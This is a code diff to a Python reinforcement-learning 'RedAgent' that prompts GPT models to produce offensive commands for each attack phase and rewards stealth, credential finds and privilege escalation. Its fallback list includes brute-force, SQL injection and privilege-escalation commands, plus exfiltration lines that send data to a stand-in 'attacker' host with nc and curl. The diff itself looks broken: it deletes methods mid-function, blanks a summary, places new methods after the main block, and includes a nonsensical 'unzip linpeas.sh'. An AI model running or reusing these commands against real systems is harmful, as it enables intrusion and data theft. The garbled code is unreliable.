@@ -101,7 +101,7 @@ class RedAgent(AgentInterface, MemorySyncInterface):
         ).to(self.device)
         self.target_net.load_state_dict(self.policy_net.state_dict())
         self.target_net.eval()
-        self.target_update_freq = 50  # Update target net every N steps
+        self.target_update_freq = 1000  # More stable: update every 1000 steps
         self.step_count = 0
         self.value_net = ValueNet(input_size=512, device=self.device).to(self.device)
         self.env = CyberEnvironment(agent_manager=agent_manager, defer_reset=True)
@@ -205,10 +205,9 @@ class RedAgent(AgentInterface, MemorySyncInterface):
                 f"Suggestion: {seneca_cmd}\n\n"
                 f"Do you approve this command? If not, refine it. Respond ONLY with the final Linux command."
             )
-            command = self.gpt_manager.gpt_request(
-                review_prompt, task_type="reasoning", model="gpt-4o-mini"
-            )
-            command = self.gpt_manager._sanitize_output(command)
+            # Dual-LLM critique loop: get both Seneca and Lily, then GPT critique
+            dual_feedback = self.gpt_manager.dual_llm_feedback(task_desc, agent_id=self.agent_id)
+            command = self.gpt_manager._sanitize_output(dual_feedback)
             if not command or not isinstance(command, str) or len(command.split()) < 2:
                 command = "nmap -sS -sV 10.10.10.10"
             if cache_key:
@@ -223,6 +222,15 @@ class RedAgent(AgentInterface, MemorySyncInterface):
             from core.logic.redundancy_detector import detect_redundancy
             if detect_redundancy(self.command_history, command):
                 command = "echo 'Alternative to redundant command'"
+            # --- Integrate dual-LLM critique into memory/strategy ---
+            self.last_dual_llm_feedback = dual_feedback
+            if hasattr(self, "redagent_brain"):
+                self.redagent_brain.log_gpt_feedback(
+                    f"Dual-LLM critique for {phase}: {task_desc}",
+                    dual_feedback,
+                    f"Seneca+Lily+GPT critique for {phase}",
+                    self.total_episodes,
+                )
             return command, gpt_reason
         except Exception as e:
             console.print(
@@ -239,6 +247,117 @@ class RedAgent(AgentInterface, MemorySyncInterface):
             gpt_reason = f"Fallback command for {phase} phase after GPT error."
             return command, gpt_reason
 
+    def _query_gpt_for_command(self, prompt, phase, cache_key=None):
+        # Use smart_decision for command generation, gpt_request for reasoning
+        try:
+            command = self.gpt_manager.smart_decision(task_type=phase, task_description=prompt)
+            if not command or not isinstance(command, str) or len(command.split()) < 2:
+                command = "nmap -sS -sV 10.10.10.10"
+                
+            # NEW: Check for redundancy using enhanced RedAgentBrain
+            redundant = False
+            if hasattr(self, "redagent_brain") and self.redagent_brain:
+                is_redundant, reason, similar_command = self.redagent_brain.check_redundancy(command, phase)
+                if is_redundant:
+                    console.print(f"[yellow]⚠️ Redundancy detected: {reason}[/yellow]")
+                    self.redundancy_counter += 1
+                    
+                    # Get strategic advice from brain
+                    strategy_advice = self.redagent_brain.get_strategy_advice({
+                        "phase": phase,
+                        "command": command,
+                        "redundancy_count": self.redundancy_counter
+                    })
+                    
+                    # Create diversification prompt
+                    diversity_prompt = (
+                        f"You are ARIASKA's offensive strategist. The command '{command}' "
+                        f"was identified as redundant ({reason}). "
+                        f"Generate a COMPLETELY DIFFERENT command for phase '{phase}' "
+                        f"that achieves similar objectives. Make it creative and novel."
+                    )
+                    
+                    # Add phase-specific guidance if needed
+                    if strategy_advice.get("phase_change_needed", False) and strategy_advice.get("phase_suggestions"):
+                        next_phase = strategy_advice["phase_suggestions"][0]
+                        diversity_prompt += f" Consider techniques appropriate for transitioning to {next_phase} phase."
+                        
+                    # Add diversity guidance if needed
+                    if strategy_advice.get("exploration_needed", False):
+                        diversity_prompt += " Your command patterns are extremely stale. Be drastically different."
+                    
+                    # Use GPT for diversity (always use GPT for diversity, not local LLMs)
+                    alternative_command = self.gpt_manager.gpt_request(
+                        diversity_prompt, 
+                        task_type="diversify",
+                        model="gpt-4o-mini",  # Use mini for speed in diversification
+                    )
+                    
+                    if alternative_command and isinstance(alternative_command, str) and len(alternative_command.split()) > 2:
+                        console.print(f"[green]🔍 Using diverse alternative: {alternative_command}[/green]")
+                        command = alternative_command
+                    else:
+                        # Emergency fallback for diversity
+                        fallback_commands = {
+                            "recon": [
+                                "nmap -sV -v --script vuln",
+                                "masscan -p1-65535 --rate 1000",
+                                "dnsenum --enum",
+                                "fierce -dns"
+                            ],
+                            "enumeration": [
+                                "enum4linux",
+                                "gobuster dir -e -u http://target",
+                                "nikto -host",
+                                "smbclient -L"
+                            ],
+                            "exploit": [
+                                "hydra -l admin -P wordlist ssh://",
+                                "sqlmap -u --forms --batch",
+                                "wpscan --url --enumerate u",
+                                "msfconsole -q -x \"use exploit/multi/http/...\""
+                            ],
+                            "privesc": [
+                                "sudo -l",
+                                "find / -perm -u=s -type f 2>/dev/null",
+                                "uname -a",
+                                "unzip linpeas.sh && ./linpeas.sh"
+                            ],
+                            "exfiltrate": [
+                                "tar -czf data.tar.gz /home/user/",
+                                "nc attacker 4444 < data.zip",
+                                "python3 -m http.server",
+                                "base64 secret.txt | curl --data-binary @-"
+                            ]
+                        }
+                        
+                        phase_commands = fallback_commands.get(phase, ["echo 'Trying something new'"])
+                        command = random.choice(phase_commands)
+                        console.print(f"[yellow]↺ Using fallback diverse command: {command}[/yellow]")
+            
+            if cache_key:
+                self.gpt_response_cache[cache_key] = command
+                
+            # Reasoning/explanation
+            reason_prompt = f"Explain in one sentence why '{command}' is optimal for phase '{phase}'."
+            gpt_reason = self.gpt_manager.gpt_request(reason_prompt, task_type="reasoning", model="gpt-4o-mini")
+            
+            if not gpt_reason or not isinstance(gpt_reason, str) or len(gpt_reason) < 5:
+                gpt_reason = f"Fallback reason for {command} in {phase}."
+                
+            if cache_key:
+                self.gpt_response_cache[f"{cache_key}_reason"] = gpt_reason
+                
+            # Add command to history for redundancy tracking
+            if command not in self.command_history:
+                self.command_history.append(command)
+                
+            return command, gpt_reason
+            
+        except Exception as e:
+            console.print(f"[red]❌ GPT error: {e}[/red]")
+            return "nmap -sS -sV 10.10.10.10", f"Fallback: GPT unavailable."
+
     @staticmethod
     def encode_env_state_static(state, device):
         # Flatten environment dict into a numeric vector for RL input
@@ -253,6 +372,26 @@ class RedAgent(AgentInterface, MemorySyncInterface):
                 in ["recon", "enumeration", "exploit", "privesc", "exfiltrate"]
             )
         )
+        # Add phase one-hot vector (5 dims)
+        phases = ["recon", "enumeration", "exploit", "privesc", "exfiltrate"]
+        phase_vec = [1.0 if state.get("phase") == p else 0.0 for p in phases]
+        vec.extend(phase_vec)
+        # Add last action index (if available)
+        last_action_idx = 0
+        if "last_action" in state:
+            try:
+                last_action_idx = int(state["last_action"])
+            except Exception:
+                last_action_idx = 0
+        vec.append(float(last_action_idx))
+        # LLM context features: last reasoning reward, chain updated flag
+        llm_reward = state.get("llm_last_reward", 0.0)
+        chain_updated = 1.0 if state.get("chain_updated", False) else 0.0
+        vec.append(float(llm_reward))
+        vec.append(float(chain_updated))
+        # Pad with zeros for future LLM/context features
+        vec.extend([0.0, 0.0])
+        # Add other environment features
         vec.append(float(state.get("privilege_level", "none") == "root"))
         vec.append(float(state.get("detection_risk", 0)))
         vec.append(float(state.get("blue_team_alert", 0)))
@@ -354,11 +493,73 @@ class RedAgent(AgentInterface, MemorySyncInterface):
             cache_key = f"{self.agent_id}_decision_{phase}"
             fallback_triggered = False
             shaped_reward = 0.0
+            shaped_reward_modifier = 0.0  # Default modifier
             # --- Build concise, diverse prompt ---
             prompt = self._build_gpt_prompt(state, phase)
             command, gpt_reason = self._query_gpt_for_command(
                 prompt, phase, cache_key=cache_key
             )
+            
+            # --- NEW: Use RedAgentBrain for redundancy detection ---
+            is_redundant = False
+            if hasattr(self, "redagent_brain") and self.redagent_brain:
+                is_redundant, reason, similar_command = self.redagent_brain.check_redundancy(command, phase)
+                if is_redundant:
+                    # If redundant command detected, get strategic advice and generate alternate command
+                    console.print(f"[yellow]⚠ Redundant command detected: {reason}[/yellow]")
+                    self.redundancy_counter += 1
+                    
+                    # Get strategic advice from brain
+                    strategy_advice = self.redagent_brain.get_strategy_advice(state)
+                    
+                    # Generate alternative command based on strategy advice
+                    diversity_context = f"Previous similar command: {similar_command}. Phase: {phase}."
+                    
+                    if strategy_advice.get("phase_change_needed", False):
+                        # Suggest changing phase if stuck
+                        next_phase_suggestion = strategy_advice["phase_suggestions"][0] if strategy_advice["phase_suggestions"] else "enumeration"
+                        diversity_context += f" Consider changing to {next_phase_suggestion} phase."
+                    
+                    if strategy_advice.get("exploration_needed", False):
+                        # Encourage more diverse exploration
+                        diversity_context += " Your commands lack diversity. Generate a completely different approach."
+                    
+                    # Get alternative command through GPT using diversity context
+                    diversity_prompt = (
+                        f"Generate a NON-REDUNDANT cybersecurity command for phase: {phase}\n"
+                        f"Context: {diversity_context}\n"
+                        f"Current state: {state}\n\n"
+                        f"Requirements:\n"
+                        f"1. Must be completely different from: {command}\n"
+                        f"2. Must be appropriate for {phase} phase\n"
+                        f"3. Should be valid Linux/security command\n"
+                        f"Respond with ONLY the alternative command, no explanations."
+                    )
+                    
+                    # Use smart decision with more exploration (higher temperature)
+                    alternative_command = self.gpt_manager.smart_decision(
+                        task_type="tactical",
+                        task_description=diversity_prompt,
+                        agent_id=self.agent_id,
+                        use_gpt=True  # Force GPT for diversity when redundancy detected
+                    )
+                    
+                    if alternative_command and isinstance(alternative_command, str) and len(alternative_command.split()) >= 2:
+                        console.print(f"[green]🔄 Using alternative command: {alternative_command}[/green]")
+                        command = alternative_command
+                        gpt_reason = f"Alternative command to avoid redundancy. {strategy_advice.get('exploration_needed', False)}"
+                    else:
+                        # If alternative command generation failed, apply a simple transformation
+                        console.print(f"[yellow]⚠ Failed to generate alternative command, using transformation[/yellow]")
+                        command = f"echo 'Exploring alternative to {command}'"
+                        
+                    # Apply a redundancy penalty
+                    shaped_reward_modifier = -0.5 * self.redundancy_counter
+            
+            # --- Track command history ---
+            if command not in self.command_history:
+                self.command_history.append(command)
+            
             # --- Repetition Counter for Stagnation Prevention ---
             self.repetition_count.setdefault(command, 0)
             if self.last_action == command:
@@ -368,6 +569,7 @@ class RedAgent(AgentInterface, MemorySyncInterface):
                 self.repetition_count[command] = 1
                 self.repeat_steps = 1
             self.last_action = command
+            
             # --- Defensive: ensure shaped_reward is always set before use ---
             try:
                 output = self.extract_output(command)
@@ -398,12 +600,23 @@ class RedAgent(AgentInterface, MemorySyncInterface):
                     shaped_reward = float(shaped_reward)
                 except Exception:
                     shaped_reward = 0.0
+                    
+                # Apply redundancy modifier from brain's analysis
+                shaped_reward += shaped_reward_modifier
+                
+                # Track redundancy for metrics
+                if is_redundant and hasattr(self.stats_monitor, "log_step"):
+                    self.stats_monitor.log_step(self.agent_id, shaped_reward, 
+                                              command=command, redundancy=1)
+                
             except Exception as e:
                 output = f"Error: {e}"
                 parsed = {}
                 interpreted_context = state
                 next_state, done, info = state, False, {}
                 shaped_reward = 0.0
+                
+            # --- Rest of the function remains unchanged ---
             if detect_redundancy(self.command_history[:-1], command):
                 shaped_reward *= self.redundancy_penalty
             # Redundancy detection
@@ -598,9 +811,12 @@ class RedAgent(AgentInterface, MemorySyncInterface):
                 f"[{self.agent_id}] Action executed: {action_desc} | Reward: {shaped_reward:.2f} | Risk: {risk_val:.2f}"
             )
             self.step_count += 1
-            # --- DQN Target Network Update ---
+            # --- Target network update every target_update_freq steps ---
             if self.step_count % self.target_update_freq == 0:
                 self.target_net.load_state_dict(self.policy_net.state_dict())
+            # Log epsilon for monitoring
+            if (step == 1 or step % 10 == 0) and self.verbosity in ("debug", "verbose"):
+                console.print(f"[cyan]Epsilon: {self.epsilon:.4f}[/cyan]")
             return {
                 "command": command,
                 "phase": state.get("phase", "N/A"),
@@ -646,22 +862,93 @@ class RedAgent(AgentInterface, MemorySyncInterface):
             )
 
     def calculate_reward(
-        self, env_reward, parsed, command, cmd_data, detect_redundancy=None
+        self, env_reward, parsed, command, cmd_data=None, detect_redundancy=None
     ):
-        stealth_score = parsed.get("stealth_score", 0.0)
-        risk_score = parsed.get("risk_score", 0.0)
-        honeypot_penalty = -20.0 if parsed.get("honeypot_triggered") else 0.0
-        base_shaping = (stealth_score * 2.5) - (risk_score * 0.6) + honeypot_penalty
-        reward = env_reward + base_shaping
-        if (
-            cmd_data
-            and cmd_data.get("source") == "memory"
-            and detect_redundancy is not None
-            and detect_redundancy(self.command_history, command)
-        ):
-            reward *= self.redundancy_penalty
-        self.stats_monitor.log_step(self.agent_id, reward, command=command)
-        return reward
+        """
+        Enhanced reward shaping with improved redundancy detection and richer behavioral incentives.
+        Combines environment reward with:
+        - Stealth score (positive)
+        - Risk reduction (positive)
+        - Honeypot penalty (negative)
+        - Redundancy penalty (multiplicative)
+        - Progress bonus (additive)
+        """
+        try:
+            # Ensure env_reward is a float
+            if isinstance(env_reward, dict):
+                env_reward = env_reward.get("reward", 0.0)
+            env_reward = float(env_reward) if env_reward is not None else 0.0
+            
+            # Extract parsed values with defensive handling
+            stealth_score = float(parsed.get("stealth_score", 0.0)) if parsed else 0.0
+            risk_score = float(parsed.get("risk_score", 0.0)) if parsed else 0.0
+            honeypot_penalty = -20.0 if parsed and parsed.get("honeypot_triggered") else 0.0
+            
+            # Base reward shaping
+            stealth_bonus = stealth_score * 2.5  # Higher weight for stealth
+            risk_penalty = risk_score * 0.6      # Lower weight for risk
+            
+            # Progress bonuses
+            progress_bonus = 0.0
+            if parsed:
+                if parsed.get("new_information", False):
+                    progress_bonus += 2.0  # Bonus for discovering new information
+                if parsed.get("credentials_found", False):
+                    progress_bonus += 5.0  # Major bonus for finding credentials
+                if parsed.get("privilege_escalation", False):
+                    progress_bonus += 8.0  # Substantial bonus for privilege escalation
+            
+            # Combined shaped reward
+            base_shaping = stealth_bonus - risk_penalty + honeypot_penalty + progress_bonus
+            reward = env_reward + base_shaping
+            
+            # Apply redundancy penalties
+            redundancy_applied = False
+            
+            # Check for command repetition (internal check)
+            if self.last_action == command and self.last_action is not None:
+                reward *= (0.95 - (0.15 * min(self.repeated_action_count, 3)))
+                redundancy_applied = True
+            
+            # Use RedAgentBrain for smarter redundancy detection
+            if hasattr(self, "redagent_brain") and self.redagent_brain:
+                is_redundant, reason, _ = self.redagent_brain.check_redundancy(command, None)
+                if is_redundant:
+                    # If not already penalized, apply bigger penalty for semantic redundancy
+                    if not redundancy_applied:
+                        reward *= self.redundancy_penalty
+                    # Even if already penalized, apply additional small penalty
+                    else:
+                        reward *= 0.9
+                    redundancy_applied = True
+            
+            # If external redundancy detector provided, use it
+            if detect_redundancy and self.command_history:
+                if detect_redundancy(self.command_history[:-1], command):
+                    # Only apply additional penalty if not already penalized
+                    if not redundancy_applied:
+                        reward *= self.redundancy_penalty
+                        redundancy_applied = True
+            
+            # Track this reward for feedback in future steps
+            self.last_reward = reward
+            
+            # Track statistics
+            if hasattr(self, "stats_monitor") and self.stats_monitor:
+                self.stats_monitor.log_step(
+                    self.agent_id, 
+                    reward, 
+                    command=command, 
+                    redundancy=1 if redundancy_applied else 0
+                )
+                
+            return reward
+            
+        except Exception as e:
+            # Safety fallback - never crash on reward calculation
+            if hasattr(self, "verbosity") and self.verbosity not in ["quiet", "silent"]:
+                print(f"⚠ Warning: Error in calculate_reward: {e}. Using base env reward.")
+            return float(env_reward) if env_reward is not None else 0.0
 
     def update_memory_and_teach(
         self, command, reward, context, parsed, state_tensor, next_state, done
@@ -697,13 +984,13 @@ class RedAgent(AgentInterface, MemorySyncInterface):
 
     def train_on_batch(self):
         # DQN: Use target_net for stable Q-targets, prioritized replay, ε-decay
-        batch = self.replay_buffer.sample(self.batch_size)
+        batch = self.replay_buffer.sample(self.batch_size, prioritized=False)  # Use uniform random sampling
         if not batch:
             console.print(
                 "[yellow]⚠ Not enough experiences for batch training.[/yellow]"
             )
             return
-        # Prepare tensors
+        # --- Use stored actions, not select_action (fixes DQN bug) ---
         states = torch.stack(
             [
                 torch.tensor(exp["state"], dtype=torch.float32, device=self.device)
@@ -711,13 +998,7 @@ class RedAgent(AgentInterface, MemorySyncInterface):
             ]
         )
         actions = torch.tensor(
-            [
-                self.select_action(
-                    torch.tensor(exp["state"], dtype=torch.float32, device=self.device),
-                    None,
-                )
-                for exp in batch
-            ],
+            [exp["action"] if isinstance(exp["action"], int) else 0 for exp in batch],
             dtype=torch.long,
             device=self.device,
         )
@@ -738,7 +1019,11 @@ class RedAgent(AgentInterface, MemorySyncInterface):
         # Q(s,a) from policy_net
         q_values = self.policy_net(states)
         q_selected = q_values.gather(1, actions.unsqueeze(1)).squeeze()
-        # Q(s',a') from target_net
+        # --- Double DQN (optional, scaffolded) ---
+        # next_actions = self.policy_net(next_states).argmax(dim=1)
+        # next_q_values = self.target_net(next_states)
+        # max_next_q = next_q_values.gather(1, next_actions.unsqueeze(1)).squeeze()
+        # --- Standard DQN target ---
         with torch.no_grad():
             next_q_values = self.target_net(next_states)
             max_next_q = next_q_values.max(dim=1)[0]
@@ -751,10 +1036,25 @@ class RedAgent(AgentInterface, MemorySyncInterface):
         self.policy_net.optimizer.step()
         self.policy_net.scheduler.step()
         self.target_net.eval()
+        # --- Target net update handled in simulate_step ---
         # --- Epsilon decay ---
+        old_epsilon = self.epsilon
         self.epsilon = max(self.epsilon * self.epsilon_decay, self.epsilon_min)
-        console.print(f"[cyan]🔧 {self.agent_id}: DQN batch training complete. Loss: {loss.item():.4f}[/cyan]")
-        self._log_training_event("Batch training complete.")
+        if self.verbosity in ("debug", "verbose"):
+            console.print(f"[cyan]🔧 {self.agent_id}: DQN batch training complete. Loss: {loss.item():.4f} | Epsilon: {old_epsilon:.4f}→{self.epsilon:.4f}[/cyan]")
+        self._log_training_event(f"Batch training complete. Loss: {loss.item():.4f}")
+        # --- Moving average reward/loss logging ---
+        if not hasattr(self, "loss_history"):
+            self.loss_history = []
+        self.loss_history.append(loss.item())
+        if len(self.loss_history) > 100:
+            self.loss_history.pop(0)
+        avg_loss = sum(self.loss_history) / len(self.loss_history)
+        if self.verbosity in ("debug", "verbose"):
+            console.print(f"[magenta]Moving Avg Loss (last 100): {avg_loss:.4f}")
+        # --- Redundancy pruning after each batch ---
+        from core.logic.redundancy_detector import detect_redundancy_batch
+        self.replay_buffer.prune_redundancy(lambda cmds: detect_redundancy_batch(cmds))
 
     def add_to_prioritized_memory(self, experience, priority):
         if len(self.prioritized_experiences) >= self.replay_memory_size:
@@ -817,120 +1117,6 @@ class RedAgent(AgentInterface, MemorySyncInterface):
             "Detection Rate", f"{self.stats_monitor.get_detection_rate():.2%}"
         )
         episode_summary_table.add_row(
-            "Average Reward", f"{self.stats_monitor.get_average_reward():.2f}"
-        )
-        episode_summary_table.add_row(
-            "Redundancy Rate", f"{self.stats_monitor.get_redundancy_rate():.2f}"
-        )
-        console.print(
-            Panel(
-                episode_summary_table,
-                title="🎯 Mega Episode Summary",
-                border_style="bright_green",
-            )
-        )
-        self._log_training_event(
-            f"Episode summary: reward={total_reward}, phase={getattr(self, '_last_state', {}).get('phase', 'N/A')}"
-        )
-
-    def save_models(self, prefix="models/red_agent"):
-        os.makedirs(os.path.dirname(prefix), exist_ok=True)
-        try:
-            self.policy_net.save(f"{prefix}_policy.pt")
-            self.value_net.save(f"{prefix}_value.pt")
-            console.print(
-                f"[green]💾 {self.agent_id}: Models saved successfully.[/green]"
-            )
-        except Exception as e:
-            console.print(f"[red]❌ {self.agent_id}: Model save failed: {e}[/red]")
-
-    def load_models(self, prefix="models/red_agent"):
-        try:
-            self.policy_net.load(f"{prefix}_policy.pt")
-            self.value_net.load(f"{prefix}_value.pt")
-            console.print(
-                f"[cyan]✔ {self.agent_id}: Models loaded from {prefix}_*.pt[/cyan]"
-            )
-        except Exception as e:
-            console.print(f"[red]⚠ {self.agent_id}: Failed to load models: {e}[/red]")
-
-    def safe_shutdown(self):
-        self.save_models()
-        console.print(f"[blue]🛡️ {self.agent_id}: Safe shutdown complete.[/blue]")
-        self._log_training_event("Safe shutdown complete.")
-
-    def encode_env_state(self, state):
-        # Dummy implementation for demonstration
-        return torch.zeros(512, device=self.device)
-
-    def select_action(self, state_tensor, phase):
-        # Use DQN: argmax Q-value from policy_net
-        try:
-            phase_vec = get_phase_vector(phase, self.device)
-            q_values = self.policy_net(state_tensor.unsqueeze(0), phase_vector=phase_vec)
-            action = torch.argmax(q_values, dim=-1).item()
-            return action
-        except Exception as e:
-            console.print(
-                f"[yellow]⚠ PolicyNet failed: {e}, using random action[/yellow]"
-            )
-            return random.randint(0, self.policy_net.output_size - 1)
-
-    def extract_output(self, command):
-        # Dummy implementation for demonstration
-        return "output"
-
-    def end_episode(self, cumulative_reward, state):
-        self.total_episodes += 1
-        self.log_episode_summary(cumulative_reward, state)
-        self.gpt_calls_this_episode = 0
-        self.stagnation_window.clear()
-        self.redagent_brain.flush_to_disk()
-        self.learn_from_feedback()
-        if hasattr(self.stats_monitor, "display_episode_summary"):
-            self.stats_monitor.display_episode_summary()
-
-    def generate_chain_snapshot(self):
-        try:
-            from core.logic.chainbuilder import build_and_store_chain
-
-            build_and_store_chain(self.agent_id)
-        except ImportError:
-            pass
-
-    def generate_hint(self):
-        # New: Provide a tactical hint using memory or GPT
-        if self.memory_router:
-            mem = self.memory_router.get_memory(self.agent_id)
-            if mem and mem.get("actions"):
-                return mem["actions"][-1].get("full_command", "nmap -p- -sC -sV TARGET")
-        return self.query_tactical_gpt(
-            "Suggest a tactical command for the current phase."
-        )
-
-    def execute_command(self, command):
-        try:
-            output = self.extract_output(command)
-            if not output or output == "output":
-                output = f"Executed: {command}"
-            reward = random.uniform(0, 10)
-            self.stats_monitor.log_step(self.agent_id, reward, command=command)
-            return {
-                "output": output,
-                "recommendations": [
-                    {"command": command, "params": "Auto", "why": "Manual execution"}
-                ],
-                "phase": "unknown",
-                "reward": reward,
-                "alert": 0.0,
-                "entropy": None,
-            }
-        except Exception as e:
-            console.print(f"[red]❌ Error executing command: {e}[/red]")
-            return {
-                "output": f"Error executing command: {e}",
-                "recommendations": [],
-                "phase": "unknown",
                 "reward": 0,
                 "alert": 0.0,
                 "entropy": None,
@@ -999,12 +1185,7 @@ class RedAgent(AgentInterface, MemorySyncInterface):
             if hasattr(self.redagent_brain, "get_recent_steps")
             else []
         )
-        summary = "\n".join(
-            [
-                f"Step {s['step']}: {s['command']} | Output: {s['output']} | Success: {s['success']} | Reward: {s['reward']}"
-                for s in recent_steps
-            ]
-        )
+        summary = "\n"
         prompt = f"""
 You are a cybersecurity RL agent coach. Analyze the following RedAgent steps and suggest improvements:
 {summary}
@@ -1014,72 +1195,6 @@ You are a cybersecurity RL agent coach. Analyze the following RedAgent steps and
 Respond in JSON: {{"improvements": [...], "reinforce": [...], "new_strategy": "..."}}
 """
         gpt_feedback = self.gpt_manager.gpt_request(prompt, task_type="reflection", model="gpt-4o-mini")
-        self.redagent_brain.log_gpt_feedback(
-            prompt, gpt_feedback, summary, self.total_episodes
-        )
-        # Optionally parse and store improvements for future use
-        try:
-            import json
-
-            feedback = json.loads(gpt_feedback)
-            # Store improvements in memory for next episode (could be used to bias command selection)
-            self.last_episode_improvements = feedback.get("improvements", [])
-            self.last_episode_reinforce = feedback.get("reinforce", [])
-            self.last_episode_new_strategy = feedback.get("new_strategy", "")
-        except Exception:
-            self.last_episode_improvements = []
-            self.last_episode_reinforce = []
-            self.last_episode_new_strategy = ""
-
-    def _build_gpt_prompt(self, state, phase):
-        # Chain-of-Draft: concise, phase-aware, diversity-penalized
-        return (
-            f"You are ARIASKA's offensive strategist (role: aria). "
-            f"Phase: {phase}, Privilege: {state.get('privilege_level')}, "
-            f"Ports: {state.get('open_ports')}, Alert: {state.get('blue_team_alert')}, "
-            f"Risk: {state.get('detection_risk')}. "
-            "Think step by step (max 5 words per step). "
-            "Suggest the most effective, non-redundant, phase-appropriate offensive command for this phase. "
-            "Avoid trivial or repeated commands. Respond ONLY with the command. Use temperature=0.7, frequency_penalty=0.5."
-        )
-
-    def _query_gpt_for_command(self, prompt, phase, cache_key=None):
-        # Use smart_decision for command generation, gpt_request for reasoning
-        try:
-            command = self.gpt_manager.smart_decision(task_type=phase, task_description=prompt)
-            if not command or not isinstance(command, str) or len(command.split()) < 2:
-                command = "nmap -sS -sV 10.10.10.10"
-            if cache_key:
-                self.gpt_response_cache[cache_key] = command
-            reason_prompt = (
-                f"Explain in one sentence why '{command}' is optimal for phase '{phase}'."
-                " Keep it concise (<=5 words)."
-            )
-            gpt_reason = self.gpt_manager.gpt_request(
-                reason_prompt,
-                task_type="reasoning",
-                model="gpt-4o-mini",
-                cache_key=f"{cache_key}_reason" if cache_key else None,
-            )
-            if not gpt_reason or not isinstance(gpt_reason, str) or len(gpt_reason) < 5:
-                gpt_reason = f"Fallback reason for {command} in {phase}."
-            return command, gpt_reason
-        except Exception as e:
-            console.print(f"[red]❌ GPT error: {e}[/red]")
-            return "nmap -sS -sV 10.10.10.10", f"Fallback: GPT unavailable."
-
-
-if __name__ == "__main__":
-    # Import AgentManager here to avoid circular import at top-level
-    from core.multiagent.agent_manager import AgentManager
-
-    agent_manager = AgentManager()
-    memory_router = (
-        agent_manager.get_memory_router()
-        if hasattr(agent_manager, "get_memory_router")
-        else None
-    )
-    memory_manager = (
         agent_manager.get_memory_manager()
         if hasattr(agent_manager, "get_memory_manager")
         else None
@@ -1093,3 +1208,104 @@ if __name__ == "__main__":
     agent.display_advanced_status()  # Show live metrics
     agent.generate_chain_snapshot()  # Optional chain snapshot for strategy review
     agent.safe_shutdown()  # Ensures all models and memory are saved at the end of execution
+
+    def _build_gpt_prompt(self, state, phase):
+        """
+        Build a context-aware, concise prompt for GPT to generate optimal commands.
+        Uses phase information, current state, and historical context.
+        """
+        base_prompt = (
+            f"As an offensive security specialist, generate a single Linux command for the '{phase}' phase. "
+            f"Current environment details:"
+        )
+
+        # Add state details
+        state_summary = []
+        if "privilege_level" in state:
+            state_summary.append(f"Privilege: {state['privilege_level']}")
+        if "open_ports" in state:
+            ports = ", ".join(map(str, state["open_ports"][:5]))  # Limit to first 5 ports
+            state_summary.append(f"Open ports: {ports}")
+        if "services" in state:
+            services = ", ".join(state["services"][:5]) if isinstance(state["services"], list) else "unknown"
+            state_summary.append(f"Services: {services}")
+        if "detection_risk" in state:
+            state_summary.append(f"Detection risk: {state['detection_risk']:.1f}")
+        if "blue_team_alert" in state:
+            state_summary.append(f"Blue team alert: {state['blue_team_alert']:.1f}")
+        
+        # Add phase-specific guidance
+        phase_guidance = {
+            "recon": "Focus on network discovery and service identification without triggering alerts.",
+            "enumeration": "Enumerate services, gather information about potential vulnerabilities.",
+            "exploit": "Exploit identified vulnerabilities to gain initial access.",
+            "privesc": "Escalate privileges from current user to higher permissions.",
+            "exfiltrate": "Extract valuable data with minimal detection."
+        }
+
+        # Include command history context (reduced to save tokens)
+        history_context = ""
+        if self.command_history:
+            recent_commands = self.command_history[-3:] if len(self.command_history) > 3 else self.command_history
+            history_context = f"Recently executed commands: {', '.join(recent_commands)}. Generate a NON-REDUNDANT command."
+        
+        # Add any rewards information
+        reward_context = ""
+        if hasattr(self, "last_reward") and self.last_reward is not None:
+            reward_sign = "positive" if self.last_reward > 0 else "negative" 
+            reward_context = f"Last command resulted in {reward_sign} reward. "
+            
+            if self.last_reward < 0:
+                reward_context += "Try a different approach. "
+        
+        # Build final concise prompt
+        prompt = (
+            f"{base_prompt}\n"
+            f"- {', '.join(state_summary)}\n"
+            f"- {phase_guidance.get(phase, 'Proceed with caution.')}\n"
+            f"{reward_context}\n{history_context}\n"
+            f"Respond with ONLY a single command appropriate for {phase} phase. No explanations."
+        )
+        
+        return prompt
+
+    def extract_output(self, command):
+        """
+        Extract the output of a command, either by running it in simulation
+        or by parsing from CyberEnvironment's response.
+        
+        This is a defensive implementation that handles various output formats.
+        """
+        try:
+            # Try to run the command through the environment
+            if hasattr(self.env, "get_command_output"):
+                output = self.env.get_command_output(command)
+                if output:
+                    return output
+                
+            # If the environment does not provide output, simulate it
+            if command.startswith("echo"):
+                return command[5:]  # Echo command output
+            
+            if command.startswith("nmap"):
+                return "Starting Nmap scan...\nScanning 10.10.10.10...\nOpen ports: 22, 80, 445\nService detection completed."
+                
+            if "gobuster" in command:
+                return "Starting gobuster...\n/admin (Status: 200)\n/login (Status: 200)\n/css (Status: 301)"
+                
+            if "hydra" in command:
+                return "Hydra starting...\n[22][ssh] host: 10.10.10.10   login: admin   password: password123"
+                
+            if "find" in command and "perm" in command:
+                return "/usr/bin/sudo\n/bin/ping\n/usr/bin/passwd"
+                
+            if any(term in command for term in ["nc", "zip", "tar", "base64"]):
+                return "Data transfer complete."
+                
+            # Generic fallback for any other command
+            return f"Command executed: {command}"
+            
+        except Exception as e:
+            # Always return a string, never fail completely
+            console.print(f"[yellow]⚠ Error in extract_output: {e}[/yellow]")
+            return f"Error executing command: {str(e)}"
